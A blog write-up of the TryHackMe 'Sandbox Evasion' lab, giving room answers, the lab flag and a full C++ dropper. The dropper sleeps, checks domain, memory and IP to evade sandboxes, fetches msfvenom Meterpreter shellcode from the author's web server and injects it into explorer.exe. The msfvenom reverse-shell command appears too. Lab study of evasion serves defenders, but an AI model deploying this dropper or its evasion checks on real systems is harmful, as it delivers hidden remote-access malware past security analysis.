---
title: Sandbox Evasion
author: CYB3RM3
name: CYB3RM3 | Sandbox Evasion
date: 2023-03-11 14:02:37 +0100
categories: [TryHackMe, RedTeam]
tags: [RedTeam, Intrusion, Sandbox, Evasion]
---

Learn about active defense mechanisms Blue Teamers can deploy to identify adversaries in their environment.

THM Room [https://tryhackme.com/room/sandboxevasion](https://tryhackme.com/room/sandboxevasion)



## TASK 1 : Introduction
### Read the task above!
No Answer

## TASK 2 : An Adversary walks into a Sandbox 
### Sandboxes are a form of ______ Analysis 

"One of the most creative and effective ways that Blue Teamers have come up with to analyze suspicious-looking files is in the category of Dynamic Analysis. "

Answer : Dynamic

### What type of Sandboxes analyze attachments attached to emails?
Answer : Mail Sandbox

## TASK 3 : Common Sandbox Evasion Techniques 
###  Read the above task to learn about Sandbox Evasion Techniques. 
No Answer.

### Download the task files and modify the .cpp file to retrieve the MSFVenom generated shellcode.

No Answer.

### Which Sandbox Evasion method would you use to abuse a Sandbox that runs for a short period of time?
### Note: most Sandboxes are only allowed to run for a short period of time

"Malware Sandboxes are often limited to a time constraint to prevent the overallocation of resources, which may increase the Sandboxes queue drastically. This is a crucial aspect that we can abuse; if we know that a Sandbox will only run for five minutes at any given time, we can implement a sleep timer that sleeps for five minutes before our shellcode is executed. This could be done in any number of ways; one common way is to query the current system time and, in a parallel thread, check and see how much time has elapsed. After the five minutes have passed, our program can begin normal execution."

Answer : Sleeping

### Which Sandbox Evasion method would you use to check the Sandboxes system information for virtualised devices?
### Note: Sandboxes usually run with limited resources and virtualised devices

"Another incredibly popular method is to observe system information. Most Sandboxes typically have reduced resources. A popular Malware Sandbox service, Any.Run, only allocates 1 CPU core and 4GB of RAM per virtual machine:"

Answer : Checking System Information

## TASK 4 : Implementing Various Evasion Techniques 
### Read about implementing various Sandbox evasion techniques. 
No Answer.

### Which evasion method involves reaching out to a host to identify your IP Address?

Answer : Geolocation Filtering

### Which evasion technique involves burning compute-time to escape the sandbox?

Answer : Sleeping

## TASK 5 : DIY Sandbox Evasion Challenge 
### Create your own Sandbox Evasion executable using the code snippets in the task and the VM as reference. Run the "SandboxChecker.exe" in a command prompt (example above) providing your executable as the argument. All checks must be implemented correctly for the flag to reveal.

```text
Note: If you have done it right, the "Sleep Check" will take approximately one minute to reveal the flag.
Note: If your DNS check has if(dcNewName.find("\\")) instead of if(dcNewName.find("\\\\")) then you may have difficulties with the sleep check.
```
{: .nolineno }

The Task as us to :


 1. Check and see if the device is joined to an Active Directory Domain
 2. Check if the system memory is greater than 1GB of RA
 3. Implement an outbound HTTP request to 10.10.10.10
 4. Implement a 60-second sleep timer before your payload is retrieved from your web server

In the Materials folder we have the dropper.cpp we can use to drop a shellcode. After reading this code, we can see several lines to modify.

We can begin by creating a reverse shell with msfvenom and starting a webserver :

```console
root@ip-10-10-46-166:~# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.46.166 LPORT=6666 -f raw -o index.raw
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Saved as: index.raw
root@ip-10-10-46-166:~# ls
Desktop  Downloads  index.raw  Instructions  Pictures  Postman  Rooms  Scripts  thinclient_drives  Tools
root@ip-10-10-46-166:~# 
root@ip-10-10-46-166:~# python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
{: .nolineno }

We can now adapt our dropper.cpp lines :

```console
//Update the dwSize variable with your shellcode size. This should be approximately 510 bytes
SIZE_T dwSize = 510;

//Update the OpenProcess Windows API with your Explorer.exe Process ID. This can be found in Task Manager
hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 5524);
```
{: .nolineno }

![explorer.exe](/images/thm/sandboxevasion/sandboxevasion_1.png)
_explorer.exe_

```console
//Update the c2URL with your IP Address and the specific URI where your raw shellcode is stored.
const char* c2URL = "http://10.10.41.166:8000/index.raw";

//Update the buff[] variable to include your shellcode size
char buff[510];

//Update the Read file descriptor to include your shellcode size
stream->Read(buff, 510, &bytesRead);
```
{: .nolineno }

We have now to add the 4 requested "checks". We are provided the code in the others cpp files. The first one should be the sleep call as mention in the hint :

![Hint](/images/thm/sandboxevasion/sandboxevasion_2.png)
_Hint_

The final dropper.cpp looks like :

```cpp
#include <iostream>
#include <Windows.h>
#include <tlhelp32.h>
#include <locale>
#include <string>
#include <urlmon.h>
#include <cstdio>
#include <lm.h>
#include <DsGetDC.h>
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "netapi32.lib")

using namespace std;

int downloadAndExecute()
{
    HANDLE hProcess;
//Update the dwSize variable with your shellcode size. This should be approximately 510 bytes
    SIZE_T dwSize = 510;
    DWORD flAllocationType = MEM_COMMIT | MEM_RESERVE;
    DWORD flProtect = PAGE_EXECUTE_READWRITE;
    LPVOID memAddr;
    SIZE_T bytesOut;
//Update the OpenProcess Windows API with your Explorer.exe Process ID. This can be found in Task Manager
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 5524);
//Update the c2URL with your IP Address and the specific URI where your raw shellcode is stored.
    const char* c2URL = "http://10.10.41.166:8000/index.raw";
    IStream* stream;
//Update the buff[] variable to include your shellcode size
    char buff[510];
    unsigned long bytesRead;
    string s;
    URLOpenBlockingStreamA(0, c2URL, &stream, 0, 0);
    while (true) {
//Update the Read file descriptor to include your shellcode size
        stream->Read(buff, 510, &bytesRead);
        if (0U == bytesRead) {
            break;
        }
        s.append(buff, bytesRead);
    }
    memAddr = VirtualAllocEx(hProcess, NULL, dwSize, flAllocationType, flProtect);

    WriteProcessMemory(hProcess, memAddr, buff, dwSize, &bytesOut);

    CreateRemoteThread(hProcess, NULL, dwSize, (LPTHREAD_START_ROUTINE)memAddr, 0, 0, 0);
    stream->Release();
    return 0;
}

BOOL isDomainController() {
    LPCWSTR dcName;
    string dcNameComp;
    NetGetDCName(NULL, NULL, (LPBYTE*)&dcName);
    wstring ws(dcName);
    string dcNewName(ws.begin(), ws.end());
    cout << dcNewName;
    // change \\ by \\\\ with the hint
    if (dcNewName.find("\\\\")) {
        return FALSE;

    }
    else {
        return TRUE;
    }
}

BOOL memoryCheck() {
    MEMORYSTATUSEX statex;
    statex.dwLength = sizeof(statex);
    GlobalMemoryStatusEx(&statex);
    // changed >= 1.0
    if (statex.ullTotalPhys / 1024 / 1024 / 1024 >= 1.00) {
        return TRUE;
    }
    else {
        return FALSE;
    }
}

BOOL checkIP()
{
    // changed IP to 10.10.10.10
    const char* websiteURL = "https://ifconfig.me/10.10.10.10";
    IStream* stream;
    string s;
    char buff[35];
    unsigned long bytesRead;
    URLOpenBlockingStreamA(0, websiteURL, &stream, 0, 0);
    while (true) {
        stream->Read(buff, 35, &bytesRead);
        if (0U == bytesRead) {
            break;
        }
        s.append(buff, bytesRead);
    }
    if (s == "VICTIM_IP") {
        return TRUE;
    }
    else {
        return FALSE;
    }
}

int main() {
    Sleep(60000);
    if (isDomainController() == TRUE) {
        if (memoryCheck() == TRUE) {
            if (checkIP() == TRUE) {
                
                downloadAndExecute();
            }
        }
    }
    return 0;
}
```
{: .nolineno }

Finnaly, we can make a new project, copy our code and build this code :

![New Project](/images/thm/sandboxevasion/sandboxevasion_3.png)
_New Project_

![Build](/images/thm/sandboxevasion/sandboxevasion_4.png)
_Build_

![THM3.exe](/images/thm/sandboxevasion/sandboxevasion_5.png)
_THM3.exe_

Once done, let's use the sandbocehcker.exe on our malware :

![Flag](/images/thm/sandboxevasion/sandboxevasion_6.png)
_Flag_

Answer : THM{6c1f95ec}

## TASK 6 : Wrapping Up 
### Read the closing task.
No Answer.
